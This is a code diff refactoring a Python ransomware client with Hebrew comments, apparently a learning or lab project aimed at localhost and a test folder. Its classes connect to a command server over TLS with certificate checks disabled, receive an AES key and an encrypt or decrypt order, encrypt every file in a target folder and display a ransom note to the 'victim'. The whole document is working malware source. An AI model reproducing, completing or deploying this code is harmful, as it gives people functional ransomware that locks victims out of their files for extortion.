@@ -8,9 +8,25 @@ from Crypto.Util.Padding import pad, unpad
 import protocol
 
 
+class SecureSocketClient:
+    """מחלקה שאחראית רק על יצירת socket עם TLS"""
+
+    def __init__(self, host, port):
+        self.host = host
+        self.port = port
+        self.context = ssl._create_unverified_context()
+
+    def connect(self):
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        secure_sock = self.context.wrap_socket(sock, server_hostname="anything")
+        secure_sock.connect((self.host, self.port))
+        print("[+] Connected to server via SSL.")
+        return secure_sock
+
+
 class FileEncryptor:
-    """מטפל בהצפנה ופיענוח של קבצים בתיקייה"""
-    
+    """אחראי על הצפנה ופענוח של קבצים"""
+
     @staticmethod
     def encrypt_all(folder_path, aes_key):
         for file_name in os.listdir(folder_path):
@@ -59,8 +75,8 @@ class FileEncryptor:
 
 
 class RansomNote:
-    """אחראית על כתיבת הודעות לרשומת הפענוח או ההצפנה"""
-    
+    """אחראי על הצגת הודעות לקורבן"""
+
     @staticmethod
     def show_encrypted():
         note = """
@@ -86,44 +102,35 @@ class RansomNote:
 
 
 class TrojanClient:
-    """מחלקת הלקוח הראשית שאחראית לתקשורת עם השרת"""
-    
+    """מחלקה שמבצעת את תקשורת השליטה לפי פרוטוקול"""
+
     def __init__(self, host, port, folder):
-        self.host = host
-        self.port = port
         self.folder = folder
-        self.context = ssl._create_unverified_context()
+        self.connection = SecureSocketClient(host, port).connect()
 
-    def connect(self):
-        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
-            with self.context.wrap_socket(s, server_hostname="anything") as secure_sock:
-                secure_sock.connect((self.host, self.port))
-                print("[+] Connected to server with TLS.")
-                self._communicate(secure_sock)
-
-    def _communicate(self, conn):
-        aes_key = protocol.receive(conn)
-        action = protocol.receive(conn).decode("utf-8")
+    def run(self):
+        aes_key = protocol.receive(self.connection)
+        action = protocol.receive(self.connection).decode("utf-8")
 
         if action == "encrypt":
             FileEncryptor.encrypt_all(self.folder, aes_key)
             del aes_key
             RansomNote.show_encrypted()
-            protocol.send(conn, "the files are encrypted")
+            protocol.send(self.connection, "the files are encrypted")
 
         elif action == "decrypt":
             FileEncryptor.decrypt_all(self.folder, aes_key)
             del aes_key
             RansomNote.show_decrypted()
-            protocol.send(conn, "the files are decrypted")
+            protocol.send(self.connection, "the files are decrypted")
 
         sys.exit()
 
 
 if __name__ == "__main__":
-    target_folder = "D:\check"
-    host = "127.0.0.1"
-    port = 44444
-    
-    client = TrojanClient(host, port, target_folder)
-    client.connect()
+    HOST = "127.0.0.1"
+    PORT = 44444
+    FOLDER = "D:\check"
+
+    client = TrojanClient(HOST, PORT, FOLDER)
+    client.run()
